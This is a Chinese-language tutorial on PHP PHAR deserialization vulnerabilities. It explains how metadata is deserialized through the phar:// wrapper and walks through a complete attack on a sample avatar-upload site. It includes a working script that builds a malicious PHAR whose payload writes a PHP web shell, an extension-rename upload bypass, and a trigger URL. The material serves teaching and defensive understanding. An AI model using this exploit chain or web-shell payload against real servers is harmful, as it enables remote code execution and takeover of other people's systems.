
这个漏洞的核心在于：**PHAR 归档文件的元数据（metadata）区在被 PHP 操作时会被自动进行反序列化。如果攻击者能够将精心制作的 PHAR 文件上传到服务器，并诱导应用以特定方式（如 `phar://` 包装器）==访问该文件，就能触发反序列化操作，从而执行恶意代码。**==

### 1. 什么是 PHAR？

- **PHAR**（PHP Archive）类似于 Java 的 JAR 文件，它将多个 PHP 文件、资源等打包成一个单独的文件，便于分发和部署。
    
- 一个 PHAR 文件包含三部分：
    
    1. **Stub**：类似 PHP 的 Shebang，是一个可执行的 PHP 代码片段，用于引导。
        
    2. **Manifest**：包含文件的元信息，如压缩方式、文件权限等。
        
    3. **File Contents**：实际的文件内容。
        
    4. **Signature**（可选）：用于验证完整性的签名。
        
- **关键点**：==Manifest 部分有一个 **`metadata`** 字段==，它可以存储任何可序列化的 PHP 变量（如数组、对象等）。

### 2. 漏洞原理

**反序列化触发点**：当 PHP 使用 **`phar://` 流包装器** 去操作一个 PHAR 文件时（例如 `file_exists()`, `fopen()`, `file_get_contents()`, `unlink()` 等文件操作函数），PHAR 扩展会**自动解析并反序列化其 `metadata` 区域存储的数据**。

这意味着，如果 `metadata` 中存储的是一个对象，那么该对象会在文件操作期间被还原（反序列化）。如果该对象的类定义了魔术方法（如 `__destruct()`, `__wakeup()`），并且这些方法中包含危险操作，攻击者就可以利用这一点执行任意代码。

**最危险的地方**：很多文件操作函数都支持流包装器，而开发者往往认为 `file_exists('uploads/user.jpg')` 是安全的，但如果文件名是 `phar://uploads/user.jpg/foo`，它就会触发 PHAR 的反序列化。==**即使文件扩展名不是 `.phar`（比如是 `.jpg`、`.txt`、`.zip` 等），只要文件内容符合 PHAR 格式，PHP 依然会将其识别为 PHAR 文件。**==

### 3. 漏洞利用条件

要成功利用 PHAR 反序列化漏洞，需要同时满足以下条件：

1. **攻击者能够将精心制作的 PHAR 文件上传到服务器**。这是前提。
    
2. **服务器上存在可被利用的类**（POP链）。这些类通常包含在应用本身的代码、框架或扩展中，其魔术方法（如 `__destruct`, `__wakeup`, `__toString` 等）中包含了危险操作。
    
3. **存在一个能够以 `phar://` 协议触发文件操作的“触发点”**。即，应用程序的代码中某处存在文件操作（如 `file_exists()`, `fopen()`），且该操作的路径（全部或部分）用户可控。

### 4. 一个完整的危害性例子
#### 场景设定

一个图片分享网站，允许用户上传头像（图片）。网站包含以下代码：
**1. 存在漏洞的类 `VulnerableClass`（通常存在于某个库或框架中）**
```php
// 可能存在于 lib/VulnerableClass.php
class VulnerableClass {
    public $cmd = 'whoami';

    // 当对象被销毁时自动调用
    public function __destruct() {
        // 危险操作！直接执行命令
        system($this->cmd);
    }
}
```
**2. 文件上传逻辑 `upload.php`**
```php
<?php
// upload.php
if (isset($_FILES['avatar'])) {
    $upload_dir = 'uploads/';
    $file_name = $_FILES['avatar']['name'];
    $file_path = $upload_dir . $file_name;

    // 简单的文件类型检查（只检查扩展名）
    $allowed_extensions = array('jpg', 'png', 'gif');
    $file_extension = strtolower(pathinfo($file_name, PATHINFO_EXTENSION));

    if (in_array($file_extension, $allowed_extensions)) {
        // 将上传的文件移动到目录
        if (move_uploaded_file($_FILES['avatar']['tmp_name'], $file_path)) {
            echo "Avatar uploaded successfully!";
        } else {
            echo "Upload failed.";
        }
    } else {
        echo "Invalid file type.";
    }
}
?>
```
**3. 文件检查/处理逻辑 `profile.php`**
```php
<?php
// profile.php - 检查用户头像是否存在并显示
$user_avatar_path = $_GET['avatar_path'] ?? 'uploads/default.jpg';

// 触发点！用户可控的路径被传入 file_exists
if (file_exists($user_avatar_path)) {
    echo "<img src='$user_avatar_path' alt='Avatar'>";
} else {
    echo "Default avatar.";
}
?>
```

#### 攻击步骤

**第1步：攻击者制作恶意 PHAR 文件**

创建一个 PHP 脚本 `create_phar.php` 来生成恶意的 PHAR 文件。这个文件的内容是一个合法的 PHAR 归档，但其 `metadata` 部分存储了一个恶意的 `VulnerableClass` 对象。
```php
<?php
// create_phar.php - 攻击者在自己的环境中运行此脚本以生成恶意PHAR文件
class VulnerableClass {
    public $cmd = 'cat /etc/passwd'; // 要执行的恶意命令
}

// 删除之前生成的phar文件（如果有）
@unlink('evil.phar');

// 创建一个新的PHAR对象
$phar = new Phar('evil.phar');
$phar->startBuffering();
// 设置stub，必须包含 `<?php __HALT_COMPILER(); ?>`
$phar->setStub('<?php __HALT_COMPILER(); ?>');

// 创建一个恶意对象，命令是写入Web Shell
$payload = new VulnerableClass();
$payload->cmd = "echo '<?php system(\\$_GET[\\\"c\\\"]); ?>' > shell.php";

// 将恶意对象作为元数据存入PHAR文件
$phar->setMetadata($payload);

// 添加一个虚拟文件到PHAR中（PHAR必须至少包含一个文件）
$phar->addFromString('test.txt', 'text');

$phar->stopBuffering();

echo "Malicious PHAR file 'evil.phar' created.\n";
?>
```
运行 `php create_phar.php`，会生成一个名为 `evil.phar` 的文件。

==PHAR 文件的结构类比==

把 PHAR 文件想象成一个 **ZIP 压缩包**：
- `evil.jpg` 是整个 PHAR 文件（就像 `archive.zip`）
- `test.txt` 是压缩包内的一个具体文件

**第2步：绕过上传限制**

直接上传 `.phar` 文件通常会被拦截。但攻击者可以：

1. **修改扩展名**：将 `evil.phar` 重命名为 `evil.jpg`。
    
2. **文件类型混淆**：PHAR 文件本身拥有合法的 ZIP 或 TAR 结构，其开头有特定标识。但简单的 `$_FILES['type']` 或扩展名检查无法识别其真实内容。
    
攻击者通过 `upload.php` 上传 `evil.jpg`。由于扩展名在白名单内，文件成功保存在 `uploads/evil.jpg`。

**第3步：触发反序列化**

攻击者访问 `profile.php`，并通过 `avatar_path` 参数传入精心构造的 `phar://` 路径：
```text
http://vulnerable-site.com/profile.php?avatar_path=phar://uploads/evil.jpg/test.txt
```
当这行代码执行时：
```php
	file_exists('phar://uploads/evil.jpg/test.txt');
```
1. PHP 识别出 `phar://` 流包装器。
    
2. 它尝试解析 `uploads/evil.jpg` 这个文件。
    
3. 尽管扩展名是 `.jpg`，但文件内容符合 PHAR 格式，PHP 将其作为 PHAR 文件处理。
    
4. 在解析过程中，PHAR 扩展会读取并**反序列化存储在 `metadata` 中的对象**。
    
5. 于是，恶意的 `VulnerableClass` 对象被创建，其 `$cmd` 属性为 `echo '<?php system($_GET["c"]); ?>' > shell.php`。
    
6. 脚本执行完毕后，该对象被销毁，触发 `__destruct()` 方法。
    
7. `__destruct()` 方法中的 `system()` 函数执行，将 Web Shell 写入当前目录（即 `profile.php` 所在目录），生成 `shell.php` 文件。、
**成功执行即可getshell**
